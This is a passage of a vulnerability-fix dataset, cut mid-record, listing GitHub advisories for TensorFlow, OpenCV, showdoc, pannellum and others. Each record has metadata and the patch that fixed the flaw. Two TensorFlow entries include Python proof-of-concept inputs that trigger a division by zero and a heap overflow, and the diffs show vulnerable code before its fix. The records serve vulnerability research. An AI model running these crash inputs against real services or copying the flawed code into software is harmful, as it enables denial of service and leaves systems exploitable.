'')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['fedora\/tg\/utils.py'])","num_files":1.0},{"index":2326,"vuln_id":"GHSA-m296-j53x-xv95","cwe_id":"{'CWE-362'}","score":8.1,"chain":"{'https:\/\/github.com\/KizzyCode\/tiny_future\/commit\/7ab8a264980d23c2ed64e72f4636f38b7381eb39', 'https:\/\/github.com\/KizzyCode\/tiny_future\/commit\/c7919199a0f6d1ce0e3c33499d1b37f862c990e4'}","dataset":"osv","summary":"Data races in tiny_future `tiny_future` contains a light-weight implementation of `Future`s. The `Future`\ntype it has lacked bound on its `Send` and `Sync` traits.\n\nThis allows for a bug where non-thread safe types such as `Cell` can be used in\n`Future`s and cause data races in concurrent programs.\n\nThe flaw was corrected in commit `c791919` by adding trait bounds to `Future`'s\n`Send` and `Sync`.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/KizzyCode\/tiny_future","commit_href":"https:\/\/github.com\/KizzyCode\/tiny_future\/commit\/7ab8a264980d23c2ed64e72f4636f38b7381eb39","commit_sha":"7ab8a264980d23c2ed64e72f4636f38b7381eb39","patch":"MULTI","chain_ord":"['c7919199a0f6d1ce0e3c33499d1b37f862c990e4', '7ab8a264980d23c2ed64e72f4636f38b7381eb39']","before_first_fix_commit":"{'c7919199a0f6d1ce0e3c33499d1b37f862c990e4'}","last_fix_commit":"7ab8a264980d23c2ed64e72f4636f38b7381eb39","chain_ord_pos":2.0,"commit_datetime":"12\/08\/2020, 16:33:00","message":"Require `Send` for underlying types to fix https:\/\/github.com\/KizzyCode\/tiny_future\/issues\/1","author":"Keziah Biermann","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/lib.rs': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/KizzyCode\/tiny_future-rust\/raw\/7ab8a264980d23c2ed64e72f4636f38b7381eb39\/src%2Flib.rs', 'patch': \"@@ -178,7 +178,7 @@ pub fn time_remaining(timeout_point: std::time::Instant) -> std::time::Duration\\n \/\/\/ Creates a future for `job` and runs `job`. The result of `job` will be set as result into the\\n \/\/\/ future. The parameter passed to `job` is a function that returns if the future is still waiting\\n \/\/\/ so that `job` can check for cancellation.\\n-pub fn async_with_state<T: 'static, U: 'static, F: FnOnce(Future<T, U>) + Send + 'static>(job: F, shared_state: U) -> Future<T, U> {\\n+pub fn async_with_state<T: 'static + Send, U: 'static + Send, F: FnOnce(Future<T, U>) + Send + 'static>(job: F, shared_state: U) -> Future<T, U> {\\n \\tuse std::clone::Clone;\\n \\t\\n \\t\/\/ Create future and spawn job\\n@@ -192,7 +192,7 @@ pub fn async_with_state<T: 'static, U: 'static, F: FnOnce(Future<T, U>) + Send +\\n \/\/\/ Creates a future for `job` and runs `job`. The result of `job` will be set as result into the\\n \/\/\/ future. The parameter passed to `job` is a function that returns if the future is still waiting\\n \/\/\/ so that `job` can check for cancellation.\\n-pub fn async<T: 'static, F: FnOnce(Future<T, ()>) + Send + 'static>(job: F) -> Future<T, ()> {\\n+pub fn async<T: 'static + Send, F: FnOnce(Future<T, ()>) + Send + 'static>(job: F) -> Future<T, ()> {\\n \\tasync_with_state(job, ())\\n }\"}}","message_norm":"require `send` for underlying types to fix https:\/\/github.com\/kizzycode\/tiny_future\/issues\/1","language":"en","entities":"[('fix', 'ACTION', ''), ('https:\/\/github.com\/kizzycode\/tiny_future\/issues\/1', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib.rs'])","num_files":1.0},{"index":2329,"vuln_id":"GHSA-m2fc-9h5m-29cm","cwe_id":"{'CWE-77'}","score":9.8,"chain":"{'https:\/\/github.com\/acrontum\/filesystem-template\/pull\/14\/commits\/baeb727b60991ad82d9e63ac660883793abc0acc'}","dataset":"osv","summary":"@acrontum\/filesystem-template vulnerable to Command Injection due to fetchRepo API missing sanitization The package @acrontum\/filesystem-template before 0.0.2 is vulnerable to Arbitrary Command Injection due to the fetchRepo API missing sanitization of the href field of external input.","published_date":"2022-08-06","chain_len":1,"project":"https:\/\/github.com\/acrontum\/filesystem-template","commit_href":"https:\/\/github.com\/acrontum\/filesystem-template\/pull\/14\/commits\/baeb727b60991ad82d9e63ac660883793abc0acc","commit_sha":"baeb727b60991ad82d9e63ac660883793abc0acc","patch":"SINGLE","chain_ord":"['baeb727b60991ad82d9e63ac660883793abc0acc']","before_first_fix_commit":"{'7883cb4e87c1bd2bf276f741fa8eeaa2af7565c7'}","last_fix_commit":"baeb727b60991ad82d9e63ac660883793abc0acc","chain_ord_pos":1.0,"commit_datetime":"04\/04\/2022, 17:45:08","message":"remove url from fetch repo\n\ncloses #13","author":"p-mcgowan","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'src\/lib\/file-utils.ts': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/acrontum\/filesystem-template\/raw\/baeb727b60991ad82d9e63ac660883793abc0acc\/src%2Flib%2Ffile-utils.ts', 'patch': \"@@ -162,7 +162,7 @@ export const fetchSource = async (pathlike: string, options?: SourceOptions): Pr\\n \\n   const cache = getCacheDir(url);\\n   if (!sourceCache[cache?.path]) {\\n-    sourceCache[cache?.path] = isRecipeFile(url.pathname) ? fetchRecipe(url, cache, options) : fetchRepo(url, cache, options);\\n+    sourceCache[cache?.path] = isRecipeFile(url.pathname) ? fetchRecipe(url, cache, options) : fetchRepo(cache, options);\\n   } else {\\n     logger.log(`cache hit on ${cache?.path}`);\\n   }\\n@@ -237,7 +237,7 @@ export const fetchRecipe = async (url: URL, cacheInfo: CacheInfo, options?: Sour\\n  *\\n  * @return {Promise<string>}  The repo.\\n  *\/\\n-export const fetchRepo = async (url: URL, cacheInfo: CacheInfo, options?: SourceOptions): Promise<string> => {\\n+export const fetchRepo = async (cacheInfo: CacheInfo, options?: SourceOptions): Promise<string> => {\\n   let branch = cacheInfo.branch;\\n   const { path: repo, origin, repoName } = cacheInfo;\\n \\n@@ -247,7 +247,7 @@ export const fetchRepo = async (url: URL, cacheInfo: CacheInfo, options?: Source\\n     return repo;\\n   }\\n \\n-  logger.debug({ url, branch, repo, origin });\\n+  logger.debug({ branch, repo, origin });\\n   logger.info(`will clone ${branch ? `${logger.blu(branch)} of ` : ''}${logger.ylw(origin)} into ${logger.grn(repoName)}`);\\n \\n   const cwd = repo;\"}}","message_norm":"remove url from fetch repo\n\ncloses #13","language":"en","entities":"[('remove', 'ACTION', ''), ('#13', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib\/file-utils.ts'])","num_files":1.0},{"index":2331,"vuln_id":"GHSA-m2q3-53fq-7h66","cwe_id":"{'CWE-200'}","score":0.0,"chain":"{'https:\/\/github.com\/gollum\/gollum\/commit\/ce68a88293ce3b18c261312392ad33a88bb69ea1'}","dataset":"osv","summary":"Moderate severity vulnerability that affects gollum The Precious module in gollum before 4.0.1 allows remote attackers to read arbitrary files by leveraging the lack of a certain temporary-file check.","published_date":"2018-08-28","chain_len":1,"project":"https:\/\/github.com\/gollum\/gollum","commit_href":"https:\/\/github.com\/gollum\/gollum\/commit\/ce68a88293ce3b18c261312392ad33a88bb69ea1","commit_sha":"ce68a88293ce3b18c261312392ad33a88bb69ea1","patch":"SINGLE","chain_ord":"['ce68a88293ce3b18c261312392ad33a88bb69ea1']","before_first_fix_commit":"{'288f75929d57bff1753b47aa860066ce674d5229'}","last_fix_commit":"ce68a88293ce3b18c261312392ad33a88bb69ea1","chain_ord_pos":1.0,"commit_datetime":"09\/20\/2015, 11:53:02","message":"Added security check.","author":"Bart Kamphorst","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'lib\/gollum\/app.rb': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gollum\/gollum\/raw\/ce68a88293ce3b18c261312392ad33a88bb69ea1\/lib%2Fgollum%2Fapp.rb', 'patch': \"@@ -176,6 +176,7 @@ def wiki_new\\n         fullname = params[:file][:filename]\\n         tempfile = params[:file][:tempfile]\\n       end\\n+      halt 500 unless tempfile.is_a? Tempfile\\n \\n       # Remove page file dir prefix from upload path if necessary -- committer handles this itself\\n       dir      = wiki.per_page_uploads ? params[:upload_dest].match(\/^(#{wiki.page_file_dir}\\\\\/+)?(.*)\/)[2] : 'uploads'\"}}","message_norm":"added security check.","language":"en","entities":"[('added', 'ACTION', ''), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/gollum\/app.rb'])","num_files":1.0},{"index":2335,"vuln_id":"GHSA-m34j-p8rj-wjxq","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/67784700869470d65d5f2ef20aeb5e97c31673cb'}","dataset":"osv","summary":"Division by 0 in `QuantizedBiasAdd` ### Impact\nAn attacker can trigger an integer division by zero undefined behavior in `tf.raw_ops.QuantizedBiasAdd`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nbias = tf.constant([], shape=[0], dtype=tf.quint8)\nmin_input = tf.constant(-10.0, dtype=tf.float32)\nmax_input = tf.constant(-10.0, dtype=tf.float32)\nmin_bias = tf.constant(-10.0, dtype=tf.float32)\nmax_bias = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBiasAdd(input=input_tensor, bias=bias, min_input=min_input,\n                            max_input=max_input, min_bias=min_bias,\n                            max_bias=max_bias, out_type=tf.qint32)\n```\n\nThis is because the [implementation of the Eigen kernel](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/61bca8bd5ba8a68b2d97435ddfafcdf2b85672cd\/tensorflow\/core\/kernels\/quantization_utils.h#L812-L849) does a division by the number of elements of the smaller input (based on shape) without checking that this is not zero:\n\n```cc\ntemplate <typename T1, typename T2, typename T3>\nvoid QuantizedAddUsingEigen(const Eigen::ThreadPoolDevice& device,\n                            const Tensor& input, float input_min,\n                            float input_max, const Tensor& smaller_input,\n                            float smaller_input_min, float smaller_input_max,\n                            Tensor* output, float* output_min,\n                            float* output_max) {\n  ...\n  const int64 input_element_count = input.NumElements();\n  const int64 smaller_input_element_count = smaller_input.NumElements();\n  ...\n  bcast[0] = input_element_count \/ smaller_input_element_count;\n  ...\n}\n```\n\nThis integral division by 0 is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [67784700869470d65d5f2ef20aeb5e97c31673cb](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/67784700869470d65d5f2ef20aeb5e97c31673cb).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/67784700869470d65d5f2ef20aeb5e97c31673cb","commit_sha":"67784700869470d65d5f2ef20aeb5e97c31673cb","patch":"SINGLE","chain_ord":"['67784700869470d65d5f2ef20aeb5e97c31673cb']","before_first_fix_commit":"{'61bca8bd5ba8a68b2d97435ddfafcdf2b85672cd'}","last_fix_commit":"67784700869470d65d5f2ef20aeb5e97c31673cb","chain_ord_pos":1.0,"commit_datetime":"04\/23\/2021, 18:11:39","message":"Prevent division by 0 in `QuantizedBiasAdd`.\n\nPiperOrigin-RevId: 370117454\nChange-Id: I3804e2ac8dcc6d3afcc92e27853e2325a017ca4d","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/quantized_bias_add_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/67784700869470d65d5f2ef20aeb5e97c31673cb\/tensorflow%2Fcore%2Fkernels%2Fquantized_bias_add_op.cc', 'patch': '@@ -56,6 +56,8 @@ class QuantizedBiasAddOp : public OpKernel {\\n             \"Must provide as many biases as the last dimension \"\\n             \"of the input tensor: \",\\n             bias.shape().DebugString(), \" vs. \", input.shape().DebugString()));\\n+    OP_REQUIRES(context, bias.NumElements() > 0,\\n+                errors::InvalidArgument(\"Must provide at least 1 bias\"));\\n \\n     Tensor* output = nullptr;\\n     OP_REQUIRES_OK(context,'}}","message_norm":"prevent division by 0 in `quantizedbiasadd`.\n\npiperorigin-revid: 370117454\nchange-id: i3804e2ac8dcc6d3afcc92e27853e2325a017ca4d","language":"it","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370117454', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_bias_add_op.cc'])","num_files":1.0},{"index":2338,"vuln_id":"GHSA-m3f9-w3p3-p669","cwe_id":"{'CWE-787', 'CWE-131'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/efea03b38fb8d3b81762237dc85e579cc5fc6e87'}","dataset":"osv","summary":"Heap buffer overflow in `QuantizedMul` ### Impact\nAn attacker can cause a heap buffer overflow in `QuantizedMul` by passing in invalid thresholds for the quantization:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)\ny = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)\nmin_x = tf.constant([], dtype=tf.float32)\nmax_x = tf.constant([], dtype=tf.float32)\nmin_y = tf.constant([], dtype=tf.float32)\nmax_y = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/87cf4d3ea9949051e50ca3f071fc909538a51cd0\/tensorflow\/core\/kernels\/quantized_mul_op.cc#L287-L290) assumes that the 4 arguments are always valid scalars and tries to access the numeric value directly:\n\n```cc \nconst float min_x = context->input(2).flat<float>()(0);\nconst float max_x = context->input(3).flat<float>()(0);\nconst float min_y = context->input(4).flat<float>()(0);\nconst float max_y = context->input(5).flat<float>()(0);\n```\n\nHowever, if any of these tensors is empty, then `.flat<T>()` is an empty buffer and accessing the element at position 0 results in overflow.\n\n### Patches\nWe have patched the issue in GitHub commit [efea03b38fb8d3b81762237dc85e579cc5fc6e87](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/efea03b38fb8d3b81762237dc85e579cc5fc6e87).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/efea03b38fb8d3b81762237dc85e579cc5fc6e87","commit_sha":"efea03b38fb8d3b81762237dc85e579cc5fc6e87","patch":"SINGLE","chain_ord":"['efea03b38fb8d3b81762237dc85e579cc5fc6e87']","before_first_fix_commit":"{'87cf4d3ea9949051e50ca3f071fc909538a51cd0'}","last_fix_commit":"efea03b38fb8d3b81762237dc85e579cc5fc6e87","chain_ord_pos":1.0,"commit_datetime":"04\/21\/2021, 23:15:46","message":"Validate inputs to `QuantizedMul`\n\nPiperOrigin-RevId: 369756982\nChange-Id: I00d960cc3b9316fd7a86bd37a44e341c96e17624","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 16, 'deletions': 4, 'total': 20}","files":"{'tensorflow\/core\/kernels\/quantized_mul_op.cc': {'additions': 16, 'deletions': 4, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/efea03b38fb8d3b81762237dc85e579cc5fc6e87\/tensorflow%2Fcore%2Fkernels%2Fquantized_mul_op.cc', 'patch': '@@ -284,10 +284,22 @@ class QuantizedMulOp : public OpKernel {\\n   void Compute(OpKernelContext* context) override {\\n     const Tensor& x = context->input(0);\\n     const Tensor& y = context->input(1);\\n-    const float min_x = context->input(2).flat<float>()(0);\\n-    const float max_x = context->input(3).flat<float>()(0);\\n-    const float min_y = context->input(4).flat<float>()(0);\\n-    const float max_y = context->input(5).flat<float>()(0);\\n+    auto& min_x_tensor = context->input(2);\\n+    OP_REQUIRES(context, TensorShapeUtils::IsScalar(min_x_tensor.shape()),\\n+                errors::InvalidArgument(\"min_x must be a scalar\"));\\n+    const float min_x = min_x_tensor.flat<float>()(0);\\n+    auto& max_x_tensor = context->input(3);\\n+    OP_REQUIRES(context, TensorShapeUtils::IsScalar(max_x_tensor.shape()),\\n+                errors::InvalidArgument(\"max_x must be a scalar\"));\\n+    const float max_x = max_x_tensor.flat<float>()(0);\\n+    auto& min_y_tensor = context->input(4);\\n+    OP_REQUIRES(context, TensorShapeUtils::IsScalar(min_y_tensor.shape()),\\n+                errors::InvalidArgument(\"min_y must be a scalar\"));\\n+    const float min_y = min_y_tensor.flat<float>()(0);\\n+    auto& max_y_tensor = context->input(5);\\n+    OP_REQUIRES(context, TensorShapeUtils::IsScalar(max_y_tensor.shape()),\\n+                errors::InvalidArgument(\"max_y must be a scalar\"));\\n+    const float max_y = max_y_tensor.flat<float>()(0);\\n \\n     BCast bcast(BCast::FromShape(x.shape()), BCast::FromShape(y.shape()));\\n     if (!bcast.IsValid()) {'}}","message_norm":"validate inputs to `quantizedmul`\n\npiperorigin-revid: 369756982\nchange-id: i00d960cc3b9316fd7a86bd37a44e341c96e17624","language":"it","entities":"[('validate', 'ACTION', ''), ('369756982', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_mul_op.cc'])","num_files":1.0},{"index":2341,"vuln_id":"GHSA-m3xv-x3ph-mq22","cwe_id":"{'CWE-94'}","score":9.8,"chain":"{'https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/0c5c0c0e0cb61000d12ec55ebf174745a5bf6469'}","dataset":"osv","summary":"Server-side Template Injection in nystudio107\/craft-seomatic A Server-side Template Injection (SSTI) vulnerability exists in Nystudio107 Seomatic prior to 3.4.12 in src\/helpers\/UrlHelper.php via the host header.","published_date":"2022-03-12","chain_len":1,"project":"https:\/\/github.com\/nystudio107\/craft-seomatic","commit_href":"https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/0c5c0c0e0cb61000d12ec55ebf174745a5bf6469","commit_sha":"0c5c0c0e0cb61000d12ec55ebf174745a5bf6469","patch":"SINGLE","chain_ord":"['0c5c0c0e0cb61000d12ec55ebf174745a5bf6469']","before_first_fix_commit":"{'1a47702db9d2df3fa3e12b1c4be09b55d2b6166f'}","last_fix_commit":"0c5c0c0e0cb61000d12ec55ebf174745a5bf6469","chain_ord_pos":1.0,"commit_datetime":"09\/25\/2021, 04:44:33","message":"Sanitize all URLs\n\nSigned-off-by: Andrew Welch <andrew@nystudio107.com>","author":"Andrew Welch","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/helpers\/UrlHelper.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nystudio107\/craft-seomatic\/raw\/0c5c0c0e0cb61000d12ec55ebf174745a5bf6469\/src%2Fhelpers%2FUrlHelper.php', 'patch': \"@@ -56,7 +56,7 @@ public static function siteUrl(string $path = '', $params = null, string $scheme\\n             return $url;\\n         }\\n \\n-        return parent::siteUrl($path, $params, $scheme, $siteId);\\n+        return DynamicMeta::sanitizeUrl(parent::siteUrl($path, $params, $scheme, $siteId));\\n     }\\n \\n     \/**\\n@@ -130,7 +130,7 @@ public static function absoluteUrlWithProtocol($url): string\\n             $url = rtrim($url, '\/');\\n         }\\n \\n-        return $url;\\n+        return DynamicMeta::sanitizeUrl($url);\\n     }\\n \\n     \/**\"}}","message_norm":"sanitize all urls\n\nsigned-off-by: andrew welch <andrew@nystudio107.com>","language":"en","entities":"[('sanitize', 'SECWORD', ''), ('andrew@nystudio107.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/helpers\/UrlHelper.php'])","num_files":1.0},{"index":2343,"vuln_id":"GHSA-m43c-649m-pm48","cwe_id":"{'CWE-190'}","score":8.8,"chain":"{'https:\/\/github.com\/opencv\/opencv\/pull\/9726\/commits\/c58152d94ba878b2d7d76bcac59146312199b9eb'}","dataset":"osv","summary":"Integer Overflow or Wraparound in OpenCV. In opencv\/modules\/imgcodecs\/src\/utils.cpp, functions FillUniColor and FillUniGray do not check the input length, which can lead to integer overflow. If the image is from remote, may lead to remote code execution or denial of service. This affects Opencv 3.3 (corresponding with OpenCV-Python 3.3.0.9) and earlier.","published_date":"2021-10-12","chain_len":1,"project":"https:\/\/github.com\/opencv\/opencv","commit_href":"https:\/\/github.com\/opencv\/opencv\/pull\/9726\/commits\/c58152d94ba878b2d7d76bcac59146312199b9eb","commit_sha":"c58152d94ba878b2d7d76bcac59146312199b9eb","patch":"SINGLE","chain_ord":"['c58152d94ba878b2d7d76bcac59146312199b9eb']","before_first_fix_commit":"{'7475d23fec4bb7c7e2b662a0fa022d706dd2b520'}","last_fix_commit":"c58152d94ba878b2d7d76bcac59146312199b9eb","chain_ord_pos":1.0,"commit_datetime":"09\/27\/2017, 06:04:01","message":"Fix out of bounds write","author":"blendin","comments":"{'com_1': {'author': 'tyomitch', 'datetime': '04\/29\/2019, 11:17:11', 'body': 'CVE-2017-1000450'}}","stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'modules\/imgcodecs\/src\/grfmt_bmp.cpp': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencv\/opencv\/raw\/c58152d94ba878b2d7d76bcac59146312199b9eb\/modules%2Fimgcodecs%2Fsrc%2Fgrfmt_bmp.cpp', 'patch': '@@ -375,6 +375,9 @@ decode_rle4_bad: ;\\n                                                 gray_palette[code] );\\n \\n                         line_end_flag = y - prev_y;\\n+\\n+                        if( y >= m_height )\\n+                            break;\\n                     }\\n                     else if( code > 2 ) \/\/ absolute mode\\n                     {'}}","message_norm":"fix out of bounds write","language":"en","entities":"[('fix', 'ACTION', ''), ('out of bounds write', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/imgcodecs\/src\/grfmt_bmp.cpp'])","num_files":1.0},{"index":2348,"vuln_id":"GHSA-m4hj-wg2r-qpcr","cwe_id":"{'CWE-352'}","score":4.3,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/67093c879a6563aa6ee08003177777d1975e2351'}","dataset":"osv","summary":"showdoc is vulnerable to Cross-Site Request Forgery (CSRF) showdoc is vulnerable to Cross-Site Request Forgery (CSRF).","published_date":"2021-11-15","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/67093c879a6563aa6ee08003177777d1975e2351","commit_sha":"67093c879a6563aa6ee08003177777d1975e2351","patch":"SINGLE","chain_ord":"['67093c879a6563aa6ee08003177777d1975e2351']","before_first_fix_commit":"{'7e6b547ac23be296f0a6066382eb1fd389af0439'}","last_fix_commit":"67093c879a6563aa6ee08003177777d1975e2351","chain_ord_pos":1.0,"commit_datetime":"10\/19\/2021, 14:19:10","message":"Strict cookie","author":"star7th","comments":null,"stats":"{'additions': 16, 'deletions': 5, 'total': 21}","files":"{'server\/Application\/Api\/Controller\/UserController.class.php': {'additions': 16, 'deletions': 5, 'changes': 21, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/67093c879a6563aa6ee08003177777d1975e2351\/server%2FApplication%2FApi%2FController%2FUserController.class.php', 'patch': '@@ -42,8 +42,12 @@ public function register(){\\n                     unset($ret[\\'password\\']);\\n                     session(\"login_user\" , $ret );\\n                     $token = D(\"UserToken\")->createToken($ret[\\'uid\\']);\\n-                    cookie(\\'cookie_token\\',$token,array(\\'expire\\'=>60*60*24*90,\\'httponly\\'=>\\'httponly\\'));\/\/\u6b64\u5904\u7531\u670d\u52a1\u7aef\u63a7\u5236token\u662f\u5426\u8fc7\u671f\uff0c\u6240\u4ee5cookies\u8fc7\u671f\u65f6\u95f4\u8bbe\u7f6e\u591a\u4e45\u90fd\u65e0\u6240\u8c13\\n-                  $this->sendResult(array(\\n+                    if(version_compare(PHP_VERSION,\\'7.3.0\\',\\'>\\')){\\n+                        setcookie(\\'cookie_token\\',$token,array(\\'expires\\'=>time()+60*60*24*180,\\'httponly\\'=>\\'httponly\\',\\'samesite\\' => \\'Strict\\',\\'path\\'=>\\'\/\\'));\\n+                      }else{\\n+                        cookie(\\'cookie_token\\',$token,array(\\'expire\\'=>60*60*24*180,\\'httponly\\'=>\\'httponly\\'));\\n+                    }\\n+                    $this->sendResult(array(\\n                     \"uid\" => $ret[\\'uid\\'] ,\\n                     \"username\" => $ret[\\'username\\'] ,\\n                     \"name\" => $ret[\\'name\\'] ,\\n@@ -134,7 +138,11 @@ public function login(){\\n           session(\"login_user\" , $ret );\\n           D(\"User\")->setLastTime($ret[\\'uid\\']);\\n           $token = D(\"UserToken\")->createToken($ret[\\'uid\\'],60*60*24*180);\\n-          cookie(\\'cookie_token\\',$token,array(\\'expire\\'=>60*60*24*180,\\'httponly\\'=>\\'httponly\\'));\/\/\u6b64\u5904\u7531\u670d\u52a1\u7aef\u63a7\u5236token\u662f\u5426\u8fc7\u671f\uff0c\u6240\u4ee5cookies\u8fc7\u671f\u65f6\u95f4\u8bbe\u7f6e\u591a\u4e45\u90fd\u65e0\u6240\u8c13\\n+          if(version_compare(PHP_VERSION,\\'7.3.0\\',\\'>\\')){\\n+            setcookie(\\'cookie_token\\',$token,array(\\'expires\\'=>time()+60*60*24*180,\\'httponly\\'=>\\'httponly\\',\\'samesite\\' => \\'Strict\\',\\'path\\'=>\\'\/\\'));\\n+          }else{\\n+            cookie(\\'cookie_token\\',$token,array(\\'expire\\'=>60*60*24*180,\\'httponly\\'=>\\'httponly\\'));\\n+          }\\n           $this->sendResult(array(\\n             \"uid\" => $ret[\\'uid\\'] ,\\n             \"username\" => $ret[\\'username\\'] ,\\n@@ -247,8 +255,11 @@ public function registerByVerify(){\\n                     unset($ret[\\'password\\']);\\n                     session(\"login_user\" , $ret );\\n                     $token = D(\"UserToken\")->createToken($ret[\\'uid\\']);\\n-                    cookie(\\'cookie_token\\',$token,array(\\'expire\\'=>60*60*24*90,\\'httponly\\'=>\\'httponly\\'));\/\/\u6b64\u5904\u7531\u670d\u52a1\u7aef\u63a7\u5236token\u662f\u5426\u8fc7\u671f\uff0c\u6240\u4ee5cookies\u8fc7\u671f\u65f6\u95f4\u8bbe\u7f6e\u591a\u4e45\u90fd\u65e0\u6240\u8c13\\n-                    \\n+                    if(version_compare(PHP_VERSION,\\'7.3.0\\',\\'>\\')){\\n+                        setcookie(\\'cookie_token\\',$token,array(\\'expires\\'=>time()+60*60*24*180,\\'httponly\\'=>\\'httponly\\',\\'samesite\\' => \\'Strict\\',\\'path\\'=>\\'\/\\'));\\n+                      }else{\\n+                        cookie(\\'cookie_token\\',$token,array(\\'expire\\'=>60*60*24*180,\\'httponly\\'=>\\'httponly\\'));\\n+                    }                    \\n                     $this->sendResult(array(\\n                         \"uid\" => $ret[\\'uid\\'] ,\\n                         \"username\" => $ret[\\'username\\'] ,'}}","message_norm":"strict cookie","language":"en","entities":"[('cookie', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Controller\/UserController.class.php'])","num_files":1.0},{"index":2350,"vuln_id":"GHSA-m52x-29pq-w3vv","cwe_id":"{'CWE-79'}","score":4.8,"chain":"{'https:\/\/github.com\/mpetroff\/pannellum\/commit\/cc2f3d99953de59db908e0c6efd1c2c17f7c6914'}","dataset":"osv","summary":"Pannellum Cross-Site Scripting due to data not being sanitized for URIs or vbscript Versions of `pannellum` prior to 2.5.6 are vulnerable to Cross-Site Scripting (XSS). The package fails to sanitize URLs for data URIs, which may allow attackers to execute arbitrary code in a victim's browser. \n\n\n## Recommendation\n\nUpgrade to version 2.5.6 or later.","published_date":"2019-11-22","chain_len":1,"project":"https:\/\/github.com\/mpetroff\/pannellum","commit_href":"https:\/\/github.com\/mpetroff\/pannellum\/commit\/cc2f3d99953de59db908e0c6efd1c2c17f7c6914","commit_sha":"cc2f3d99953de59db908e0c6efd1c2c17f7c6914","patch":"SINGLE","chain_ord":"['cc2f3d99953de59db908e0c6efd1c2c17f7c6914']","before_first_fix_commit":"{'40111b237e763821437f501c94d8511022274dc3', 'f42e80facb41bb97321a0e2056d9ef5a4779e627'}","last_fix_commit":"cc2f3d99953de59db908e0c6efd1c2c17f7c6914","chain_ord_pos":1.0,"commit_datetime":"11\/22\/2019, 01:35:45","message":"Merge pull request from GHSA-m52x-29pq-w3vv\n\nFix potential XSS vulnerability","author":"Matthew 